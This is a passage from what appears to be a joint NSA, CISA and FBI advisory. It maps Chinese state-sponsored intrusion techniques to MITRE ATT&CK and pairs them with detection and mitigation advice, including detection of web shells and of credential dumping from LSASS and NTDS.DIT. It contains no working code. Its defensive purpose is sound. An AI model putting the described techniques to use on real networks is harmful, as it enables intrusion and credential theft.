Exploitation of Public Vulnerabilities. Chinese state-sponsored cyber actors consistently scan target networks for critical and high vulnerabilities within days of the vulnerability’s public disclosure. In many cases, these cyber actors seek to exploit vulnerabilities in major applications, such as Pulse Secure, Apache, F5 Big-IP, and Microsoft products. For information on Common Vulnerabilities and Exposures (CVE) known to be exploited by malicious Chinese state-sponsored cyber actors, see:


CISA-FBI Joint CSA AA20-133A: Top 10 Routinely Exploited Vulnerabilities,


CISA Activity Alert: AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions, and


NSA CSA U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities.




Encrypted Multi-Hop Proxies. Chinese state-sponsored cyber actors have been routinely observed using a VPS as an encrypted proxy. The cyber actors use the VPS as well as small office and home office (SOHO) devices as operational nodes to evade detection.


Observed Tactics and Techniques
Chinese state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest worldwide and to acquire sensitive intellectual property, economic, political, and military information. Appendix B: MITRE ATT&CK Framework lists the tactics and techniques used by Chinese state-sponsored cyber actors. A downloadable JSON file is also available on the NSA Cybersecurity GitHub page.
Refer to Appendix A: Chinese State-Sponsored Cyber Actors’ Observed Procedures for information on procedures affiliated with these tactics and techniques as well as applicable mitigations.

Figure 1: Example of tactics and techniques used in various cyber operations.
 
Mitigations
NSA, CISA, and FBI urge federal and SLTT government, CI, DIB, and private industry organizations to apply the following recommendations as well as the detection and mitigation recommendations in Appendix A, which are tailored to observed tactics and techniques:


Patch systems and equipment promptly and diligently. Focus on patching critical and high vulnerabilities that allow for remote code execution or denial-of-service on externally facing equipment and CVEs known to be exploited by Chinese state-sponsored cyber actors. Consider implementing a patch management program that enables a timely and thorough patching cycle.
Note: for more information on CVEs routinely exploited by Chinese state-sponsored cyber actors refer to the resources listed in the Trends in Chinese State-Sponsored Cyber Operations section.

Enhance monitoring of network traffic, email, and endpoint systems. Review network signatures and indicators for focused activities, monitor for new phishing themes, and adjust email rules accordingly. Follow the best practices of restricting attachments via email and blocking URLs and domains based upon reputation. Ensure that log information is aggregated and correlated to enable maximum detection capabilities, with a focus on monitoring for account misuse. Monitor common ports and protocols for command and control (C2) activity. SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols. Implement and enhance network and endpoint event analysis and detection capabilities to identify initial infections, compromised credentials, and the manipulation of endpoint processes and files.
Use protection capabilities to stop malicious activity. Implement anti-virus software and other endpoint protection capabilities to automatically detect and prevent malicious files from executing. Use a network intrusion detection and prevention system to identify and prevent commonly employed adversarial malware and limit nefarious data transfers. Use a domain reputation service to detect suspicious or malicious domains. Use strong credentials for service accounts and multi-factor authentication (MFA) for remote access to mitigate an adversary's ability to leverage stolen credentials, but be aware of MFA interception techniques for some MFA implementations.▪

Resources
Refer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and https://www.nsa.gov/What-We-Do/Cybersecurity/Advisories-Technical-Guidance/ for previous reporting on Chinese state-sponsored malicious cyber activity.
Disclaimer of Endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed by NSA, CISA, and FBI in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/.
Trademark Recognition
MITRE and ATT&CK are registered trademarks of The MITRE Corporation. • D3FEND is a trademark of The MITRE Corporation. • Microsoft, Microsoft Exchange, Office 365, Microsoft Office, OneDrive, Outlook, OWA, PowerShell, Windows Defender, and Windows are registered trademarks of Microsoft Corporation. • Pulse Secure is a registered trademark of Pulse Secure, LLC. • Apache is a registered trademark of Apache Software Foundation. • F5 and BIG-IP are registered trademarks of F5 Networks. • Cobalt Strike is a registered trademark of Strategic Cyber LLC. • GitHub is a registered trademark of GitHub, Inc. • JavaScript is a registered trademark of Oracle Corporation. • Python is a registered trademark of Python Software Foundation. • Unix is a registered trademark of The Open Group. • Linux is a registered trademark of Linus Torvalds. • Dropbox is a registered trademark of Dropbox, Inc.
APPENDIX A: Chinese State-Sponsored Cyber Actors’ Observed Procedures
Note: D3FEND techniques are based on the Threat Actor Procedure(s) and may not match automated mappings to ATT&CK techniques and sub-techniques.
Tactics: Reconnaissance [TA0043]    
Table 1: Chinese state-sponsored cyber actors’ Reconnaissance TTPs with detection and mitigation recommendations




Threat Actor
			Technique / Sub-Techniques


Threat Actor Procedure(s)


Detection and Mitigation Recommendations


Defensive Tactics and Techniques






Active Scanning [T1595] 


Chinese state-sponsored cyber actors have been assessed to perform reconnaissance on Microsoft® 365 (M365), formerly Office® 365, resources with the intent of further gaining information about the networks. These scans can be automated, through Python® scripts, to locate certain files, paths, or vulnerabilities. The cyber actors can gain valuable information on the victim network, such as the allocated resources, an organization’s fully qualified domain name, IP address space, and open ports to target or exploit.


Minimize the amount and sensitivity of data available to external parties, for example: 


Scrub user email addresses and contact lists from public websites, which can be used for social engineering, 


Share only necessary data and information with third parties, and 


Monitor and limit third-party access to the network. 


Active scanning from cyber actors may be identified by monitoring network traffic for sources associated with botnets, adversaries, and known bad IPs based on threat intelligence.


Detect: 


Network Traffic Analysis


Connection Attempt Analysis [D3-CAA]




Isolate: 


Network Isolation


Inbound Traffic Filtering [D3-ITF]








Gather Victim Network Information [T1590]
 




Tactics: Resource Development [TA0042]
Table II: Chinese state-sponsored cyber actors’ Resource Development TTPs with detection and mitigation recommendations




Threat Actor
			Technique / Sub-Techniques


Threat Actor Procedure(s)


Detection and Mitigation Recommendations

Defensive Tactics and Techniques





Acquire Infrastructure [T1583]
 


Chinese state-sponsored cyber actors have been observed using VPSs from cloud service providers that are physically distributed around the world to host malware and function as C2 nodes.
 


Adversary activities occurring outside the organization’s boundary of control and view makes mitigation difficult. Organizations can monitor for unexpected network traffic and data flows to and from VPSs and correlate other suspicious activity that may indicate an active threat.
 


N/A




Stage Capabilities [T1608]




Obtain Capabilities [T1588]: 


Tools [T1588.002]




Chinese state-sponsored cyber actors have been observed using Cobalt Strike® and tools from GitHub® on victim networks. 


Organizations may be able to identify malicious use of Cobalt Strike by:


Examining network traffic using Transport Layer Security (TLS) inspection to identify Cobalt Strike. Look for human generated vice machine-generated traffic, which will be more uniformly distributed. 


Looking for the default Cobalt Strike TLS certificate. 


Look at the user agent that generates the TLS traffic for discrepancies that may indicate faked and malicious traffic.


Review the traffic destination domain, which may be malicious and an indicator of compromise.


Look at the packet's HTTP host header. If it does not match with the destination domain, it may indicate a fake Cobalt Strike header and profile.


Check the Uniform Resource Identifier (URI) of the flow to see if it matches one associated with Cobalt Strike's malleable C2 language. If discovered, additional recovery and investigation will be required.


 

N/A



Tactics: Initial Access [TA0001]
Table III: Chinese state-sponsored cyber actors’ Initial Access TTPs with detection and mitigation recommendations




Threat Actor Technique /
			Sub-Techniques


Threat Actor Procedure(s)


Detection and Mitigation Recommendations


Detection and Mitigation Recommendations






Drive By Compromise [T1189]


Chinese state-sponsored cyber actors have been observed gaining access to victim networks through watering hole campaigns of typo-squatted domains.



Ensure all browsers and plugins are kept up to date.
Use modern browsers with security features turned on.
Restrict the use of unneeded websites, block unneeded downloads/attachments, block unneeded JavaScript®, restrict browser extensions, etc.
Use adblockers to help prevent malicious code served through advertisements from executing. 
Use script blocking extensions to help prevent the execution of unneeded JavaScript, which may be used during exploitation processes. 
Use browser sandboxes or remote virtual environments to mitigate browser exploitation.
Use security applications that look for behavior used during exploitation, such as Windows Defender® Exploit Guard (WDEG).



Detect: 

Identifier Analysis

Homoglyph Detection [D3-HD]
URL Analysis [D3-UA]


File Analysis

Dynamic Analysis [D3-DA]



Isolate: 

Execution Isolation

Hardware-based Process Isolation [D3-HBPI]
Executable Allowlisting [D3-EAL]


Network Isolation

DNS Denylisting [D3-DNSDL] 
Outbound Traffic Filtering [D3-OTF]







Exploit Public-Facing Application [T1190]


Chinese state-sponsored cyber actors have exploited known vulnerabilities in Internet-facing systems.[1] For information on vulnerabilities known to be exploited by Chinese state-sponsored cyber actors, refer to the Trends in Chinese State-Sponsored Cyber Operations section for a list of resources.
			Chinese state-sponsored cyber actors have also been observed:


Using short-term VPS devices to scan and exploit vulnerable Microsoft Exchange® Outlook Web Access (OWA®) and plant webshells.


Targeting on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments to gain access to cloud resources.


Deploying a public proof of concept (POC) exploit targeting a public-facing appliance vulnerability.




Review previously published alerts and advisories from NSA, CISA, and FBI, and diligently patch vulnerable applications known to be exploited by cyber actors. Refer to the Trends in Chinese State-Sponsored Cyber Operations section for a non-inclusive list of resources.
Additional mitigations include:

Consider implementing Web Application Firewalls (WAF), which can prevent exploit traffic from reaching an application.
Segment externally facing servers and services from the rest of the network with a demilitarized zone (DMZ).
Use multi-factor authentication (MFA) with strong factors and require regular re-authentication.
Disable protocols using weak authentication.
Limit access to and between cloud resources with the desired state being a Zero Trust model. For more information refer to NSA Cybersecurity Information Sheet: [Embracing a Zero Trust Security Model].
When possible, use cloud-based access controls on cloud resources (e.g., cloud service provider (CSP)-managed authentication between virtual machines).
Use automated tools to audit access logs for security concerns.
Where possible, enforce MFA for password resets.
Do not include Application Programing Interface (API) keys in software version control systems where they can be unintentionally leaked.



Harden:

Application Hardening [D3-AH]
Platform Hardening

Software Update [D3-SU]



Detect:

File Analysis [D3-FA] 
Network Traffic Analysis

Client-server Payload Profiling [D3-CSPP]


Process Analysis 

Process Spawn Analysis
Process Lineage Analysis [D3-PLA]



Isolate: 

Network Isolation

Inbound Traffic Filtering [D3-ITF]







Phishing [T1566]: 


Spearphishing Attachment [T1566.001] 


Spearphishing Link [T1566.002]




Chinese state-sponsored cyber actors have been observed conducting spearphishing campaigns. These email compromise attempts range from generic emails with mass targeted phishing attempts to specifically crafted emails in targeted social engineering lures. 
			These compromise attempts use the cyber actors’ dynamic collection of VPSs, previously compromised accounts, or other infrastructure in order to encourage engagement from the target audience through domain typo-squatting and masquerading. These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. 



Implement a user training program and simulated spearphishing emails to discourage users from visiting malicious websites or opening malicious attachments and re-enforce the appropriate user responses to spearphishing emails. Quarantine suspicious files with antivirus solutions.
Use a network intrusion prevention system (IPS) to scan and remove malicious email attachments.
Block uncommon file types in emails that are not needed by general users (.exe, .jar,.vbs)
Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using Sender Policy Framework [SPF]) and integrity of messages (using Domain Keys Identified Mail [DKIM]). Enabling these mechanisms within an organization (through policies such as Domain-based Message Authentication, Reporting, and Conformance [DMARC]) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.
Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.
Prevent users from clicking on malicious links by stripping hyperlinks or implementing ""URL defanging"" at the Email Security Gateway or other email security tools.
Add external sender banners to emails to alert users that the email came from an external sender.



Harden: 

Message Hardening

Message Authentication [D3-MAN]
Transfer Agent Authentication [D3-TAAN]



Detect: 

File Analysis

Dynamic Analysis [D3-DA]


Identifier Analysis

Homoglyph Detection [D3-HD]
URL Analysis [D3-UA]


Message Analysis

Sender MTA Reputation Analysis [D3-SMRA]
Sender Reputation Analysis [D3-SRA]
					 







External Remote Services [T1133]


Chinese state-sponsored cyber actors have been observed:


Exploiting vulnerable devices immediately after conducting scans for critical zero-day or publicly disclosed vulnerabilities. The cyber actors used or modified public proof of concept code in order to exploit vulnerable systems.


Targeting Microsoft Exchange offline address book (OAB) virtual directories (VDs).


Exploiting Internet accessible webservers using webshell small code injections against multiple code languages, including net, asp, apsx, php, japx, and cfm. 


Note: refer to the references listed above in Exploit Public-Facing Application [T1190] for information on CVEs known to be exploited by malicious Chinese cyber actors.

Note: this technique also applies to Persistence [TA0003].



Many exploits can be mitigated by applying available patches for vulnerabilities (such as CVE-2019-11510, CVE-2019-19781, and CVE-2020-5902) affecting external remote services.
Reset credentials after virtual private network (VPN) devices are upgraded and reconnected to the external network.
Revoke and generate new VPN server keys and certificates (this may require redistributing VPN connection information to users).
Disable Remote Desktop Protocol (RDP) if not required for legitimate business functions.
Restrict VPN traffic to and from managed service providers (MSPs) using a dedicated VPN connection.
Review and verify all connections between customer systems, service provider systems, and other client enclaves.



Harden:

Software Update [D3-SU]

Detect:

Network Traffic Analysis

Connection Attempt Analysis [D3-CAA]


Platform Monitoring [D3-PM]
Process Analysis

Process Spawn Analysis [D3-SPA] 

Process Lineage Analysis [D3-PLA]









Valid Accounts [T1078]:


Default Accounts [T1078.001]


Domain Accounts [T1078.002]




Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks.
Note: this technique also applies to Persistence [TA0003], Privilege Escalation [TA0004], and Defense Evasion [TA0005].



Adhere to best practices for password and permission management.
Ensure that MSP accounts are not assigned to administrator groups and restrict those accounts to only systems they manage 
Do not store credentials or sensitive data in plaintext.
Change all default usernames and passwords.
Routinely update and secure applications using Secure Shell (SSH). 
Update SSH keys regularly and keep private keys secure.
Routinely audit privileged accounts to identify malicious use.



Harden: 

Credential Hardening

Multi-factor Authentication [D3-MFA]



Detect:

User Behavior Analysis [D3-UBA]

Authentication Event Thresholding [D3-ANET] 
Job Function Access Pattern Analysis [D3-JFAPA]







Tactics: Execution [TA0002]
Table IV: Chinese state-sponsored cyber actors’ Execution TTPs with detection and mitigation recommendations




Threat Actor Technique /
			Sub-Techniques


Threat Actor Procedure(s)


Detection and Mitigation Recommendations


Defensive Tactics and Techniques






Command and Scripting Interpreter [T1059]: 


PowerShell® [T1059.001]


Windows® Command Shell [T1059.003]


Unix® Shell [T1059.004]


Python [T1059.006]


JavaScript [T1059.007]


Network Device CLI [T1059.008]




Chinese state-sponsored cyber actors have been observed:


Using cmd.exe, JavaScript/Jscript Interpreter, and network device command line interpreters (CLI).


Using PowerShell to conduct reconnaissance, enumeration, and discovery of the victim network. 


Employing Python scripts to exploit vulnerable servers.


Using a UNIX shell in order to conduct discovery, enumeration, and lateral movement on Linux® servers in the victim network.




PowerShell


Turn on PowerShell logging. (Note: this works better in newer versions of PowerShell. NSA, CISA, and FBI recommend using version 5 or higher.)


Push Powershell logs into a security information and event management (SIEM) tool.


Monitor for suspicious behavior and commands. Regularly evaluate and update blocklists and allowlists.


Use an antivirus program, which may stop malicious code execution that cyber actors attempt to execute via PowerShell.


Remove PowerShell if it is not necessary for operations. 


Restrict which commands can be used.


Windows Command Shell


Restrict use to administrator, developer, or power user systems. Consider its use suspicious and investigate, especially if average users run scripts. 


Investigate scripts running out of cycle from patching or other administrator functions if scripts are not commonly used on a system, but enabled. 


Monitor for and investigate other unusual or suspicious scripting behavior. 


Unix


Use application controls to prevent execution.


Monitor for and investigate unusual scripting behavior. Use of the Unix shell may be common on administrator, developer, or power user systems. In this scenario, normal users running scripts should be considered suspicious. 


If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions should be considered suspicious. 


Python


Audit inventory systems for unauthorized Python installations.


Blocklist Python where not required.


Prevent users from installing Python where not required.


JavaScript


Turn off or restrict access to unneeded scripting components.


Blocklist scripting where appropriate.


For malicious code served up through ads, adblockers can help prevent that code from executing.


Network Device Command Line Interface (CLI)


Use TACACS+ to keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization.


Use an authentication, authorization, and accounting (AAA) systems to limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse.


Ensure least privilege principles are applied to user accounts and groups.




Harden: 


Platform Hardening [D3-PH]


Detect: 


Process Analysis


Script Execution Analysis [D3-SEA]




Isolate:


Execution Isolation


Executable Allowlisting [D3-EAL]








Scheduled Task/Job [T1053]

Cron [T1053.003]
Scheduled Task [T1053.005]



Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks.

Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004].


•    Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity.
			•    Configure event logging for scheduled task creation and monitor process execution from svchost.exe (Windows 10) and Windows Task Scheduler (Older version of Windows) to look for changes in %systemroot%\System32\Tasks that do not correlate with known software, patch cycles, or other administrative activity. Additionally monitor for any scheduled tasks created via command line utilities—such as PowerShell or Windows Management Instrumentation (WMI)—that do not conform to typical administrator or user actions. 


Detect: 

Platform Monitoring

Operating System Monitoring [D3-OSM]

Scheduled Job Analysis [D3-SJA]
System Daemon Monitoring [D3-SDM]
System File Analysis [D3-SFA]





Isolate: 

Execution Isolation

Executable Allowlisting [D3-EAL]







User Execution [T1204]

Malicious Link [T1204.001]
Malicious File [T1204.002]



Chinese state-sponsored cyber actors have been observed conducting spearphishing campaigns that encourage engagement from the target audience. These emails may contain a malicious link or file that provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment.



Use an antivirus program, which may stop malicious code execution that cyber actors convince users to attempt to execute.
Prevent unauthorized execution by disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications.
Use a domain reputation service to detect and block suspicious or malicious domains.
Determine if certain categories of websites are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.
Ensure all browsers and plugins are kept up to date.
Use modern browsers with security features turned on.
Use browser and application sandboxes or remote virtual environments to mitigate browser or other application exploitation.



Detect: 

File Analysis

Dynamic Analysis [D3-DA]
File Content Rules [D3-FCR]


Identifier Analysis

Homoglyph Detection [D3-HD]
URL Analysis [D3-UA]


Network Traffic Analysis

DNS Traffic Analysis [D3-DNSTA]



Isolate: 

Execution Isolation

Hardware-based Process Isolation [D3-HBPI]
Executable Allowlisting [D3-EAL]


Network Isolation

DNS Denylisting [D3-DNSDL]
Outbound Traffic Filtering [D3-OTF]







Tactics: Persistence [TA0003]
Table V: Chinese state-sponsored cyber actors’ Persistence TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Hijack Execution Flow [T1574]: 

DLL Search Order Hijacking [T1574.001]



Chinese state-sponsored cyber actors have been observed using benign executables which used Dynamic Link Library (DLL) load-order hijacking to activate the malware installation process. 
Note: this technique also applies to Privilege Escalation [TA0004] and Defense Evasion [TA0005].



Disallow loading of remote DLLs.
Enable safe DLL search mode.
Implement tools for detecting search order hijacking opportunities.
Use application allowlisting to block unknown DLLs.
Monitor the file system for created, moved, and renamed DLLs.
Monitor for changes in system DLLs not associated with updates or patches.
Monitor DLLs loaded by processes (e.g., legitimate name, but abnormal path).



Detect: 

Platform Monitoring

Operating System Monitoring

Service Binary Verification [D3-SBV]




Process Analysis

File Access Pattern Analysis [D3-FAPA]



Isolate: 

Execution Isolation

Executable Allowlisting [D3-EAL]







Modify Authentication Process [T1556]

Domain Controller Authentication [T1556.001]



Chinese state-sponsored cyber actors were observed creating a new sign-in policy to bypass MFA requirements to maintain access to the victim network.
			Note: this technique also applies to Defense Evasion [TA0005] and Credential Access [TA0006].



Monitor for policy changes to authentication mechanisms used by the domain controller. 
Monitor for modifications to functions exported from authentication DLLs (such as cryptdll.dll and samsrv.dll).
Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. 
Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts (for example, one account logged into multiple systems simultaneously, multiple accounts logged into the same machine simultaneously, accounts logged in at odd times or outside of business hours). 
Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).
Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for and correlate changes to Registry entries.



Detect: 

Process Analysis [D3-PA]
User Behavior Analysis

Authentication Event Thresholding [D3-ANET]
User Geolocation Logon Pattern Analysis [D3-UGLPA]  







Server Software Component [T1505]: 


Web Shell [T1505.003]




Chinese state-sponsored cyber actors have been observed planting web shells on exploited servers and using them to provide the cyber actors with access to the victim networks. 



Use Intrusion Detection Systems (IDS) to monitor for and identify China Chopper traffic using IDS signatures.
Monitor and search for predictable China Chopper shell syntax to identify infected files on hosts.
Perform integrity checks on critical servers to identify and investigate unexpected changes.
Have application developers sign their code using digital signatures to verify their identity.
Identify and remediate web application vulnerabilities or configuration weaknesses. Employ regular updates to applications and host operating systems.
Implement a least-privilege policy on web servers to reduce adversaries’ ability to escalate privileges or pivot laterally to other hosts and control creation and execution of files in particular directories.
If not already present, consider deploying a DMZ between web-facing systems and the corporate network. Limiting the interaction and logging traffic between the two provides a method to identify possible malicious activity.
Ensure secure configuration of web servers. All unnecessary services and ports should be disabled or blocked. Access to necessary services and ports should be restricted, where feasible. This can include allowlisting or blocking external access to administration panels and not using default login credentials.
Use a reverse proxy or alternative service, such as mod_security, to restrict accessible URL paths to known legitimate ones.
Establish, and backup offline, a “known good” version of the relevant server and a regular change management policy to enable monitoring for changes to servable content with a file integrity system.
Employ user input validation to restrict exploitation of vulnerabilities.
Conduct regular system and application vulnerability scans to establish areas of risk. While this method does not protect against zero-day exploits, it will highlight possible areas of concern.
Deploy a web application firewall and conduct regular virus signature checks, application fuzzing, code reviews, and server network analysis.



Detect: 

Network Traffic Analysis

Client-server Payload Profiling [D3-CSPP]
Per Host Download-Upload Ratio Analysis [D3-PHDURA]


Process Analysis 

Process Spawn Analysis

Process Lineage Analysis [D3-PLA]





Isolate:

Network Isolation

Inbound Traffic Filtering [D3-ITF]







Create or Modify System Process [T1543]:


Windows Service [T1543.003]




Chinese state-sponsored cyber actors have been observed executing malware shellcode and batch files to establish new services to enable persistence.
Note: this technique also applies to Privilege Escalation [TA0004].



Only allow authorized administrators to make service changes and modify service configurations. 
Monitor processes and command-line arguments for actions that could create or modify services, especially if such modifications are unusual in your environment.
Monitor WMI and PowerShell for service modifications.


Detect:

Process Analysis 

Process Spawn Analysis [D3-PSA]







Tactics: Privilege Escalation [TA0004]
Table VI: Chinese state-sponsored cyber actors’ Privilege Escalation TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Domain Policy Modification [T1484]


Group Policy Modification [T1484.001]




Chinese state-sponsored cyber actors have also been observed modifying group policies for password exploitation.
Note: this technique also applies to Defense Evasion [TA0005].



Identify and correct Group Policy Object (GPO) permissions abuse opportunities (e.g., GPO modification privileges) using auditing tools.
Monitor directory service changes using Windows event logs to detect GPO modifications. Several events may be logged for such GPO modifications.
Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.



Detect:

Network Traffic Analysis

Administrative Network Activity Analysis [D3-ANAA]


Platform Monitoring

Operating System Monitoring

System File Analysis [D3-SFA]









Process Injection [T1055]: 

Dynamic Link Library Injection [T1055.001]
Portable Executable Injection [T1055.002]



Chinese state-sponsored cyber actors have been observed:

Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement.
Using shellcode that injects implants into newly created instances of the Service Host process (svchost)

Note: this technique also applies to Defense Evasion [TA0005].
			 



Use endpoint protection software to block process injection based on behavior of the injection process.
Monitor DLL/Portable Executable (PE) file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.
Monitor for suspicious sequences of Windows API calls such as CreateRemoteThread, VirtualAllocEx, or WriteProcessMemory and analyze processes for unexpected or atypical behavior such as opening network connections or reading files.
To minimize the probable impact of a threat actor using Mimikatz, always limit administrative privileges to only users who actually need it; upgrade Windows to at least version 8.1 or 10; run Local Security Authority Subsystem Service (LSASS) in protected mode on Windows 8.1 and higher; harden the local security authority (LSA) to prevent code injection.




Execution Isolation

Hardware-based Process Isolation [D3-HBPI]
Mandatory Access Control [D3-MAC]







Tactics: Defense Evasion [TA0005]
Table VII: Chinese state-sponsored cyber actors’ Defensive Evasion TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Deobfuscate/Decode Files or Information [T1140]


Chinese state-sponsored cyber actors were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device.



Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.
Consider blocking, disabling, or monitoring use of 7-Zip.



Detect: 

Process Analysis 

Process Spawn Analysis [D3-PSA]



Isolate: 

Execution Isolation

Executable Denylisting [D3-EDL]







Hide Artifacts [T1564]


Chinese state-sponsored cyber actors were observed using benign executables which used DLL load-order hijacking to activate the malware installation process.



Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts, such as executables using DLL load-order hijacking that can activate malware.
Monitor event and authentication logs for records of hidden artifacts being used.
Monitor the file system and shell commands for hidden attribute usage.



Detect: 

Process Analysis

File Access Pattern Analysis [D3-FAPA] 



Isolate:

Execution Isolation

Executable Allowlisting [D3-EAL]







Indicator Removal from Host [T1070]


Chinese state-sponsored cyber actors have been observed deleting files using rm or del commands.
			Several files that the cyber actors target would be timestomped, in order to show different times compared to when those files were created/used.



Make the environment variables associated with command history read only to ensure that the history is preserved.
Recognize timestomping by monitoring the contents of important directories and the attributes of the files. 
Prevent users from deleting or writing to certain files to stop adversaries from maliciously altering their ~/.bash_history or ConsoleHost_history.txt files.
Monitor for command-line deletion functions to correlate with binaries or other files that an adversary may create and later remove. Monitor for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce.
Monitor and record file access requests and file handles. An original file handle can be correlated to a compromise and inconsistencies between file timestamps and previous handles opened to them can be a detection rule.



Detect: 

Platform Monitoring

Operating System Monitoring

System File Analysis [D3-SFA]




Process Analysis

File Access Pattern Analysis [D3-FAPA] 



Isolate:

Execution Isolation

Executable Allowlisting [D3-EAL]







Obfuscated Files or Information [T1027]


Chinese state-sponsored cyber actors were observed Base64 encoding files and command strings to evade security measures.


Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted.


Detect:

Process Analysis

File Access Pattern Analysis [D3-FAPA]







Signed Binary Proxy Execution [T1218]


Mshta [T1218.005]


Rundll32 [T1218.011]




Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads.


Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary.


Detect:


Process Analysis


File Access Pattern Analysis [D3-FAPA]


Process Spawn Analysis [D3-PSA] 








Tactics: Credential Access [TA0006]
Table VIII: Chinese state-sponsored cyber actors’ Credential Access TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





Exploitation for Credential Access [T1212]


Chinese state-sponsored cyber actors have been observed exploiting Pulse Secure VPN appliances to view and extract valid user credentials and network information from the servers.




Update and patch software regularly.


Use cyber threat intelligence and open-source reporting to determine vulnerabilities that threat actors may be actively targeting and exploiting; patch those vulnerabilities immediately.




Harden: 


Platform Hardening


Software Update [D3-SU]




Credential Hardening


Multi-factor Authentication [D3-MFA]








OS Credential Dumping [T1003]
			•    LSASS Memory [T1003.001]
			•    NTDS [T1003.003]


Chinese state-sponsored cyber actors were observed targeting the LSASS process or Active directory (NDST.DIT) for credential dumping.




Monitor process and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NDST.DIT.


Ensure that local administrator accounts have complex, unique passwords across all systems on the network.


Limit credential overlap across accounts and systems by training users and administrators not to use the same passwords for multiple accounts.


Consider disabling or restricting NTLM. 


Consider disabling WDigest authentication. 


Ensure that domain controllers are backed up and properly secured (e.g., encrypt backups).


Implement Credential Guard to protect the LSA secrets from credential dumping on Windows 10. This is not configured by default and requires hardware and firmware system requirements. 


Enable Protected Process Light for LSA on Windows 8.1 and Windows Server 2012 R2.




Harden:


Credential Hardening [D3-CH]


Detect: 


Process Analysis


File Access Pattern Analysis [D3-FAPA]


System Call Analysis [D3-SCA]




Isolate: 


Execution Isolation


Hardware-based Process Isolation [D3-HBPI]


Mandatory Access Control [D3-MAC]








Tactics: Discovery [TA0007]
Table IX: Chinese state-sponsored cyber actors’ Discovery TTPs with detection and mitigation recommendations



Threat Actor Technique /
			Sub-Techniques
Threat Actor Procedure(s)
Detection and Mitigation Recommendations
Defensive Tactics and Techniques





File and Directory Discovery [T1083]


Chinese state-sponsored cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities.


Monitor processes and command-line arguments for actions that could be taken to gather system and network information. WMI and PowerShell should also be monitored.


Detect: 


User Behavior Analysis


Job Function Access Pattern Analysis [D3-JFAPA]




Process Analysis 


Database Query String Analysis [D3-DQSA]


File Access Pattern Analysis [D3-FAPA]


Process Spawn Analysis [D3-PSA]








Permission Group Discovery [T1069]


Chinese state-sponsored cyber actors have been observed using commands, including net group and net localgroup, to enumerate the different user groups on the target network. 


Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.


Detect: 


Process Analysis 


Process Spawn Analysis [D3-PSA]


System Call Analysis [D3-SCA]




User Behavior Analysis [D3-UBA]  






Process Discovery [T1057]

